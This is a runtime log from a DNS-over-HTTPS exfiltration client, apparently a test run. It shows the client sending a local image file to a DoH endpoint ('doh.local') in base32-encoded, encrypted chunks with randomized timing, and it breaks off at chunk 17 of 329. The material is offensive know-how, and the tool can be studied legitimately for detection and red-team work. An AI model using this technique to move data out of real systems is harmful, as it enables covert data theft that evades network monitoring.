[client] Starting quick test: apt.json
Starting DoH exfiltration: /app/test_data/image.png
Configuration: Server: https://doh.local/dns-query, Chunk: 8, Encoding: base32, Timing: random
Checking DoH server connectivity...
Testing server: https://doh.local/dns-query
Attempt 1/10...
DoH server connectivity verified with google.com
Server ready for exfiltration!
Chunk size calculation:
   File size: 6,918 bytes
   Strategy: medium file
   Optimal chunk size: 30 chars
   Estimated chunks: 323
   Estimated time: 9690.0s
Chunk size: 8 â†’ 30 (auto-adjusted)
ðŸ—œï¸  Compressed: 6918 -> 6165 bytes
Chunk size calculation:
   File size: 6,165 bytes
   Strategy: medium file
   Optimal chunk size: 30 chars
   Estimated chunks: 288
   Estimated time: 8640.0s
Encrypted data
Encoded with base32: 9864 chars
File size: 6918 bytes
Prepared data size: 9864 bytes
Total chunks: 329

Starting chunk transmission...
Session ID: 1755189907_ll9xoxuy
Estimated transmission time: 12337.5s
Chunk utilization: 100.0%
[  1/329] Sent chunk: 17551899-0000-0329-P35XYX77PXYA6XMLRDVZQCB7HDA4PT....
[  2/329] Sent chunk: 17551899-0001-0329-YMIOL5EIBBFERCKIBBZAIOGRDSQLSH....
[  3/329] Sent chunk: 17551899-0002-0329-2PCEIK7GSUZFFCWMLUMIECQHICADJA....
[  4/329] Sent chunk: 17551899-0003-0329-ETQDBJEWRXII24WTUGJA4SLGESFIV7....
[  5/329] Sent chunk: 17551899-0004-0329-TGPJWFO3D3X3LTW27ODR26675APD2D....
[  6/329] Sent chunk: 17551899-0005-0329-IXBVQXBAHFKYMHCZK7MCOR2POO7K2Y....
[  7/329] Sent chunk: 17551899-0006-0329-YQNIR4CDEXYNLUJSUKVKTE74MGJCHT....
[  8/329] Sent chunk: 17551899-0007-0329-JLZXU2MJP2UWUNMCLWQEEGLZJJFU2P....
[  9/329] Sent chunk: 17551899-0008-0329-ZPBO7ENXWNP2BI6PGJIEI3Z4XWR2ZA....
[ 10/329] Sent chunk: 17551899-0009-0329-VDVRRZYC5ZX27CK723QWF2I6T437AE....
[ 11/329] Sent chunk: 17551899-0010-0329-ICYEIHQJ5HMLWKJ7P5ZYWB5EDE5RWD....
[ 12/329] Sent chunk: 17551899-0011-0329-FLIWQAAISYHEKTKBJFDU6Q2LITGMB7....
[ 13/329] Sent chunk: 17551899-0012-0329-ZK4JXIFNUSQZDNNMA7UMJ3HSSYVL7A....
[ 14/329] Sent chunk: 17551899-0013-0329-FASCYMQNOR5NRDPRBFETCNIG4VUSS3....
[ 15/329] Sent chunk: 17551899-0014-0329-H5IIEQY4RQHTDERGZLVGV2QXSV2L7O....
[ 16/329] Sent chunk: 17551899-0015-0329-PI5LU6X2A2D4EBRFMGG4HX77C62PRK....
[ 17/329] Sent chunk: 17551899-0016-0329-G4DLBPND3E5TQPTWPLVOZYXK63GN3Q....
